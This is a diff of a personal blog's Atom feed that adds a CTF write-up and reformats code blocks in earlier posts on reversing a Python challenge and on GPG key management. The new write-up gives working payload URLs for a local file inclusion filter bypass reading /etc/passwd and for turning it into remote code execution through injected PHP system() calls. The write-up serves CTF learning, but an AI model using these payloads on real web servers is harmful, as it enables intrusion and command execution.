@@ -1,14 +1,50 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Railslide - Giulia Vergottini</title><link href="https://railslide.io/" rel="alternate"></link><link href="https://railslide.io/feeds/giulia-vergottini.atom.xml" rel="self"></link><id>https://railslide.io/</id><updated>2020-04-18T00:00:00+02:00</updated><entry><title>TG:HACK 2020 Writeup - A game of keys</title><link href="https://railslide.io/tghack-2020-writeup-a-game-of-keys.html" rel="alternate"></link><published>2020-04-18T00:00:00+02:00</published><updated>2020-04-18T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2020-04-18:/tghack-2020-writeup-a-game-of-keys.html</id><summary type="html">&lt;p&gt;During Easter I played the TG:HACK 2020 CTF. Here' is my writeup for the &lt;em&gt;A game of keys&lt;/em&gt; challenge.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Railslide - Giulia Vergottini</title><link href="https://railslide.io/" rel="alternate"></link><link href="https://railslide.io/feeds/giulia-vergottini.atom.xml" rel="self"></link><id>https://railslide.io/</id><updated>2021-03-17T00:00:00+01:00</updated><entry><title>KYBC 2021 - Maze 1 Writeup</title><link href="https://railslide.io/kybc-yogosha-2021-writeups.html" rel="alternate"></link><published>2021-03-17T00:00:00+01:00</published><updated>2021-03-17T00:00:00+01:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2021-03-17:/kybc-yogosha-2021-writeups.html</id><summary type="html">&lt;p&gt;My writeup for Maze 1 challenge at KYBC CTF&lt;/p&gt;</summary><content type="html">&lt;p&gt;The site is basically a search box that checks for matching txt files and then redirects to &lt;code&gt;http://5.150.254.85:8082/lookup.php?f=file.txt&lt;/code&gt; to display the content of the file. &lt;code&gt;flag.txt&lt;/code&gt; obviously leads to a fake flag, but the whole thing looks like a potential LFI.&lt;/p&gt;
+&lt;p&gt;Trying to reach a file with an extension other than &lt;code&gt;.txt&lt;/code&gt; results in an error. However, appending an extra &lt;code&gt;f&lt;/code&gt; parameters after one with the &lt;code&gt;.txt&lt;/code&gt; extension lets me bypass the extension check and access the content of the last file.&lt;/p&gt;
+&lt;p&gt;The txt files are inside a &lt;code&gt;files/&lt;/code&gt; folder and there seem to be some sort of sanitization mechanism, since &lt;code&gt;../&lt;/code&gt; get stripped away. However, the filter applies only to that specific pattern, so &lt;code&gt;....//&lt;/code&gt; becomes &lt;code&gt;../&lt;/code&gt; after sanitation and allows me to look up into the parent folder.&lt;/p&gt;
+&lt;p&gt;Combining the two bypasses together gets me the &lt;code&gt;etc/passwd&lt;/code&gt; file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;amp;f=....//....//....//....//etc/passwd`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The flag doesn't seem to be there though.&lt;/p&gt;
+&lt;p&gt;Let's see if it is possible to turn this LFI into an RCE, since trying to guess name and location of the flag doesn't sound like a realistic strategy.&lt;/p&gt;
+&lt;p&gt;By examining the &lt;code&gt;proc/self/fd&lt;/code&gt; folder I discover that &lt;code&gt;proc/self/fd/11&lt;/code&gt; stores the serialized parameters of the search request. Let's see if we can write by making a POST request containing &lt;code&gt;&amp;lt;?php system('id'); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;and check the proc file again&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;amp;f=....//....//....//....//proc/self/fd/11&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Yeah! The code gets executed and the result gets saved into it!!&lt;/p&gt;
+&lt;p&gt;Let's run &lt;code&gt;ls /&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;No flag in the root folder, but &lt;code&gt;home/ctf_user1&lt;/code&gt; seems interesting:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;there's the flag - let's cat it!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Success! &lt;code&gt;FLAG_c4a66ead822b8d2dd42da826eb180371&lt;/code&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="ctf"></category><category term="lfi"></category><category term="rce"></category><category term="kybc"></category></entry><entry><title>TG:HACK 2020 Writeup - A game of keys</title><link href="https://railslide.io/tghack-2020-writeup-a-game-of-keys.html" rel="alternate"></link><published>2020-04-18T00:00:00+02:00</published><updated>2020-04-18T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2020-04-18:/tghack-2020-writeup-a-game-of-keys.html</id><summary type="html">&lt;p&gt;During Easter I played the TG:HACK 2020 CTF. Here' is my writeup for the &lt;em&gt;A game of keys&lt;/em&gt; challenge.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
 &lt;p&gt;Download this file and get the flag. You will also need this wordlist.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The provided files are a python compiled file (keygame.pyc) and a txt file with a list of gibberish words (wordlist.txt). The wordlist didn't seem very interesting, so I proceeded to decompile the python file&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ uncompyle6 keygame.pyc &amp;gt; keygame.py
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ uncompyle6 keygame.pyc &amp;gt; keygame.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And had a look at the source code&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;myGame&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
@@ -59,12 +95,12 @@
     &lt;span class="n"&gt;y1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input a number: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;make_keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;My take from it was that the programs takes four inputs and uses them for creating a key based on a matrix and on the wordlist. If the resulting key is the correct one, the &lt;code&gt;checkdata&lt;/code&gt; function is going to print out the flag.&lt;/p&gt;
 &lt;p&gt;Running the program confirmed my theory&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python keygame.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python keygame.py
 input a number: &lt;span class="m"&gt;1&lt;/span&gt;
 input a number: &lt;span class="m"&gt;1&lt;/span&gt;
 input a number: &lt;span class="m"&gt;1&lt;/span&gt;
@@ -73,12 +109,12 @@ aa0caa0c
 &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;RYAW   DASA_BYF
                            ^
                              ^ &lt;span class="nv"&gt;aa0caa0c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; TG31&lt;span class="o"&gt;{&lt;/span&gt;tils gmag!vhotmd c&lt;span class="sb"&gt;`&lt;/span&gt; oo!tei%mono&lt;span class="o"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, how to figure out what are the correct inputs? The sources shows that the game is created with a 25x25 matrix (&lt;code&gt;mgame = myGame(25, 25)&lt;/code&gt;) and since the inputs are used as indexes for the matrix, any input greater than 24 should be invalid.&lt;/p&gt;
 &lt;p&gt;A quick run of the program confirmed this theory as well&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python keygame.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python keygame.py
 input a number: &lt;span class="m"&gt;25&lt;/span&gt;
 input a number: &lt;span class="m"&gt;25&lt;/span&gt;
 input a number: &lt;span class="m"&gt;25&lt;/span&gt;
@@ -89,11 +125,11 @@ Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span clas
   File &lt;span class="s2"&gt;&amp;quot;keygame.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;34&lt;/span&gt;, in make_keys
     keyArray.append&lt;span class="o"&gt;(&lt;/span&gt;self.matrix&lt;span class="o"&gt;[&lt;/span&gt;args&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]][&lt;/span&gt;args&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]])&lt;/span&gt;
 IndexError: list index out of range
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;So, I needed a way to test all the possible combinations of four inputs ranging from 0 to 24 and it turned out that python has a built-in way for doing just that. Enter &lt;code&gt;itertools.products&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keygame&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;myGame&lt;/span&gt;
 
 &lt;span class="n"&gt;inputs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
@@ -106,22 +142,22 @@ IndexError: list index out of range
     &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TG20{&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;I commented out the &lt;code&gt;print&lt;/code&gt; statements from keygame.py to reduce the noise, and then waited for my script to spit out the flag&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TG20{this flag should be on teh moon}&amp;#39;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;</content><category term="CTF"></category><category term="ctf"></category><category term="reverse"></category></entry><entry><title>How to sign PGP keys with an offline master key</title><link href="https://railslide.io/how-to-sign-pgp-keys-with-offline-master-key.html" rel="alternate"></link><published>2017-06-03T00:00:00+02:00</published><updated>2017-06-03T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2017-06-03:/how-to-sign-pgp-keys-with-offline-master-key.html</id><summary type="html">&lt;p&gt;Signing other people keys with an offline master key is not super straightforward. Here's how to do it in an almost pain-free way.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Lately I wanted to sign a coworker's key, so after having gone through the all in-real-life verification shebang together, all that was left was me performing the actual signing. However, since I &lt;a href="https://railslide.io/create-gpg-key-with-subkeys.html"&gt;use subkeys on my laptop&lt;/a&gt;, I first needed to get out my master key from its secret dungeon and tell GPG to use that one instead of the usual subkey. For doing that I used the handy &lt;code&gt;--homedir&lt;/code&gt; option.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --homedir&lt;span class="o"&gt;=&lt;/span&gt;/path/to/my/master/gnupg/folder --sign-key mycoworker@myjob.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39;TG20{this flag should be on teh moon}&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="CTF"></category><category term="ctf"></category><category term="reverse"></category></entry><entry><title>How to sign PGP keys with an offline master key</title><link href="https://railslide.io/how-to-sign-pgp-keys-with-offline-master-key.html" rel="alternate"></link><published>2017-06-03T00:00:00+02:00</published><updated>2017-06-03T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2017-06-03:/how-to-sign-pgp-keys-with-offline-master-key.html</id><summary type="html">&lt;p&gt;Signing other people keys with an offline master key is not super straightforward. Here's how to do it in an almost pain-free way.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Lately I wanted to sign a coworker's key, so after having gone through the all in-real-life verification shebang together, all that was left was me performing the actual signing. However, since I &lt;a href="https://railslide.io/create-gpg-key-with-subkeys.html"&gt;use subkeys on my laptop&lt;/a&gt;, I first needed to get out my master key from its secret dungeon and tell GPG to use that one instead of the usual subkey. For doing that I used the handy &lt;code&gt;--homedir&lt;/code&gt; option.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --homedir&lt;span class="o"&gt;=&lt;/span&gt;/path/to/my/master/gnupg/folder --sign-key mycoworker@myjob.com
 gpg: key &lt;span class="s2"&gt;&amp;quot;mycoworker@myjob.com&amp;quot;&lt;/span&gt; not found: public key not found
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;How's that possible? I am positive that I've imported my coworker's key - we have even exchanged encrypted email with each other!&lt;/p&gt;
 &lt;p&gt;Well, the fact is that I imported the key, yes, but I did it in my local keyring which is the one located at &lt;code&gt;~/.gnupg&lt;/code&gt; and thus not the one my master key refers to. Pretty much as when using GPG on multiple computers: you have to re-import all the public keys from scratch.&lt;/p&gt;
 &lt;p&gt;Ok, so what are the options? Export the key I want to sign, import it into the master keyring, sign it, export it from the master keyiring, and finally import it into the local keyring? Sure, you could do that, but it's quite cumbersome. Fortunately, gpg has a better solution for that: the &lt;code&gt;--keyring&lt;/code&gt; option!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --homedir&lt;span class="o"&gt;=&lt;/span&gt;/path/to/my/master/gnupg/folder --keyring ~/.gnupg/pubring.gpg --sign-key mycoworker@myjob.com
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --homedir&lt;span class="o"&gt;=&lt;/span&gt;/path/to/my/master/gnupg/folder --keyring ~/.gnupg/pubring.gpg --sign-key mycoworker@myjob.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And voilà! Now you can proceed signing the key.&lt;/p&gt;</content><category term="cryptography"></category><category term="GPG"></category><category term="cryptography"></category><category term="howto"></category></entry><entry><title>How to create a GPG key with subkeys</title><link href="https://railslide.io/create-gpg-key-with-subkeys.html" rel="alternate"></link><published>2017-04-19T00:00:00+02:00</published><updated>2017-04-19T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2017-04-19:/create-gpg-key-with-subkeys.html</id><summary type="html">&lt;p&gt;A step by step guide for creating a GPG key with subkeys.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I wanted to create a GPG key - so far so good. The problem is that I also wanted to use GPG on multiple devices, ideally even on my phone. I could have - &lt;em&gt;in theory&lt;/em&gt; - copied the key over to all the needed machines, but that would have been a terrible ide. What if I lose my phone/laptop? My key would be compromised and I'd be left with no other choice than revoking it and losing all the previous signatures.&lt;/p&gt;
@@ -132,16 +168,16 @@ gpg: key &lt;span class="s2"&gt;&amp;quot;mycoworker@myjob.com&amp;quot;&lt;/spa
 &lt;h2&gt;Set GPG to prefer SHA2&lt;/h2&gt;
 &lt;p&gt;GPG defaults to SHA1 as preferred hash, so let's set it to prefer SHA2 instead.
 Check if the following lines are present in &lt;code&gt;~/.gnupg/gpg.conf&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;personal-digest-preferences SHA512 SHA384 SHA256 SHA224&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;personal-digest-preferences SHA512 SHA384 SHA256 SHA224&lt;/span&gt;
 &lt;span class="err"&gt;default-preference-list SHA512 SHA384 SHA256 SHA224 AES256 AES192 AES CAST5 BZIP2 ZLIB ZIP Uncompressed&lt;/span&gt;
 &lt;span class="err"&gt;cert-digest-algo SHA512&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;If not, add them.&lt;/p&gt;
 &lt;h2&gt;Create a master key&lt;/h2&gt;
 &lt;p&gt;Create the master key - I'm going to mark user inputs with &lt;code&gt;# [input value] &amp;lt;--&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --gen-key
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --gen-key
 gpg &lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.4.11&lt;span class="p"&gt;;&lt;/span&gt; Copyright &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2010&lt;/span&gt; Free Software Foundation, Inc.
 This is free software: you are free to change and  redistribute it.
 There is NO WARRANTY, to the extent permitted by law.
@@ -152,11 +188,11 @@ Please &lt;span class="k"&gt;select&lt;/span&gt; what kind of key you want:
     &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; DSA &lt;span class="o"&gt;(&lt;/span&gt;sign only&lt;span class="o"&gt;)&lt;/span&gt;
     &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; RSA &lt;span class="o"&gt;(&lt;/span&gt;sign only&lt;span class="o"&gt;)&lt;/span&gt;
     Your selection? &lt;span class="c1"&gt;# 1 &amp;lt;--&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;When it comes to choosing the length make sure to choose the longest available option (4096 at the time of writing).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;RSA keys may be between &lt;span class="m"&gt;1024&lt;/span&gt; and &lt;span class="m"&gt;4096&lt;/span&gt; bits long.
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;RSA keys may be between &lt;span class="m"&gt;1024&lt;/span&gt; and &lt;span class="m"&gt;4096&lt;/span&gt; bits long.
 What keysize &lt;span class="k"&gt;do&lt;/span&gt; you want? &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# 4096 &amp;lt;-- (the longer the better!)&lt;/span&gt;
 
 Requested keysize is &lt;span class="m"&gt;4096&lt;/span&gt; bits
@@ -184,11 +220,11 @@ You selected this USER-ID:
     &lt;span class="s2"&gt;&amp;quot;[Your name] &amp;lt;[your email address]&amp;gt;&amp;quot;&lt;/span&gt;
 
 Change &lt;span class="o"&gt;(&lt;/span&gt;N&lt;span class="o"&gt;)&lt;/span&gt;ame, &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt;omment, &lt;span class="o"&gt;(&lt;/span&gt;E&lt;span class="o"&gt;)&lt;/span&gt;-mail or &lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt;kay/&lt;span class="o"&gt;(&lt;/span&gt;Q&lt;span class="o"&gt;)&lt;/span&gt;uit? &lt;span class="c1"&gt;# o &amp;lt;--&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;When prompted for a passphrase, make sure to choose a strong one - ideally long and hard to guess. If someone gets access to the secret key, the passphrase would be the only thing left to prevent them from using it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;You need a Passphrase to protect your secret key.
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;You need a Passphrase to protect your secret key.
 &lt;span class="c1"&gt;# Enter passphrase &amp;lt;--&lt;/span&gt;
 
 We need to generate a lot of random bytes. It is a good idea to perform
@@ -208,13 +244,13 @@ pub   4096R/&lt;span class="o"&gt;[&lt;/span&gt;your key ID&lt;span class="o"&gt
       Key &lt;span class="nv"&gt;fingerprint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Key fingerprint&lt;span class="o"&gt;]&lt;/span&gt;
 uid                  &lt;span class="o"&gt;[&lt;/span&gt;Your name&lt;span class="o"&gt;]&lt;/span&gt; &amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
 sub   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub ID&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;2017&lt;/span&gt;-04-17
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Congratulations! The master key has been created!&lt;/p&gt;
 &lt;h2&gt;Set your key to prefer strong hashes&lt;/h2&gt;
 &lt;p&gt;In theory, if hash preferences were set in the &lt;code&gt;gpg.conf&lt;/code&gt; file before creating the key, this step should not be necessary. But better safe than sorry.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --edit-key &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --edit-key &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;
 gpg &lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.4.11&lt;span class="p"&gt;;&lt;/span&gt; Copyright &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2010&lt;/span&gt; Free Software Foundation, Inc.
 This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.
@@ -249,12 +285,12 @@ pub  4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your key ID&lt;span class="o"&gt;
